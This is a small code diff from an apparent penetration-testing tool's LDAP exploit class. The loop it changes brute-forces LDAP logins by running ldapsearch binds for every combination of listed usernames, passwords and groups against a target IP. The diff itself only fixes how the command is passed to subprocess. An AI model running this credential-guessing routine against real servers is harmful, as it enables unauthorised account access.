@@ -22,7 +22,7 @@ class LDAP(Exploit):
         # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
         for username, password, group in it.product(usernames, passwords, common_groups):
             command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
-                      f' -w {password} -b {domainstring}')
+                      f' -w {password} -b {domainstring}').split()
             result = subprocess.run(command, capture_output=True, text=True)
             captured_output = result.stdout
             captured_err = result.stderr
